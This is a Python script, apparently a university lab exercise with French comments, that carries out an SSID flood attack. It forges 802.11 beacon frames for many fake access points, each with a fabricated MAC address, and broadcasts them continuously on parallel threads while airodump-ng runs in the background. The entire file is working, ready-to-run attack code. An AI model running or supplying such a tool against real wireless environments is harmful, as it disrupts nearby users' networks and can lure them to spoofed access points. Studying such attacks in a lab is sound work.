#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Created By  : Nicolas Hungerbühler & Lucas Gianinetti
# Created Date: 31.03.22
# ---------------------------------------------------------------------------
# Ce programme génère des APs afin de faire une attaque de type flood SSID.
# Il prend en paramètre une interface réseau (/!\ Doit être en mode
# monitor channel hopping /!\), un fichier contenant des noms de SSID (un par
# par ligne). Ensuite il génère un AP par nom contenu dans le fichier.
# Si aucun fichier n'est passé en paramètre, il sera demandé à l'utilisateur
# un nombre d'AP à générer.
# ---------------------------------------------------------------------------

import argparse
import names

from faker import Faker
from threading import Thread
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Elt, Dot11Beacon, sendp

################## Passing arguments ##################
parser = argparse.ArgumentParser(prog="Scapy SSID flood attack",
                                usage="%(prog)s -i wlan0mon -f file.txt",
                                description="Scapy SSID flood attack",
                                allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="the interface we want to sniff to be on, needs to be set to monitor mode with channel hopping")

parser.add_argument("-f", "--File", required=False,
                    help="the file containing the title of the SSID to create, one on each line")

args = parser.parse_args()

####################################
################## variables ##################

IFACE_NAME = args.Interface
FILE = args.File
SSID_to_generate = []
threads = []

# Si jamais l'interface est down
os.system("ifconfig %s up" % IFACE_NAME)
#Launch airodump-ng en background / screen permet de ne pas afficher sur la console le process passé en argument
p = subprocess.Popen(['screen','-d','-m','airodump-ng',IFACE_NAME])

####################################
################## fonctions ##################

def send_beacon(ssid, mac, iface):
        #Préparation de la frame à envoyer
        netSSID = ssid  #SSID de l'AP à spoof
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac) #envoi de la frame en broadcast, la MAC src et la MAC de l'AP sont les mêmes et valeurs bidons
        beacon = Dot11Beacon(cap='ESS+privacy') #Permet à l'AP d'apparaître comme sécurisé
        essid = Dot11Elt(ID='SSID', info=netSSID, len=len(netSSID))

        #build de la frame
        frame = RadioTap()/dot11/beacon/essid

        #envoi de la frame en continu toutes les 0.1 secondes depuis l'interface IFACE_NAME
        sendp(frame, iface=iface, inter=0.100, loop=1)

####################################
################## main ##################

# On vérifie si l'argument fichier a été donnée
# Si c'est le cas on lit le fichier ligne par ligne
# Si ce n'est pas le cas on invente des noms
if FILE is not None:
    f = open(FILE, "r")
    for line in f:
        SSID_to_generate.append(line[:-1]) #Pour enlever le saut de ligne
    f.close()
else:
    user_input = input("Combien d'AP voulez-vous générer ? \n")
    for i in range(0, int(user_input)):
        SSID_to_generate.append(names.get_first_name())

# Utilisation de thread pour créer les trames et les envoyer
faker = Faker()
for ssid in SSID_to_generate:
    threads.append(threading.Thread(target=send_beacon, args=(ssid, faker.mac_address(), IFACE_NAME)))

for t in threads:
    t.start()
    


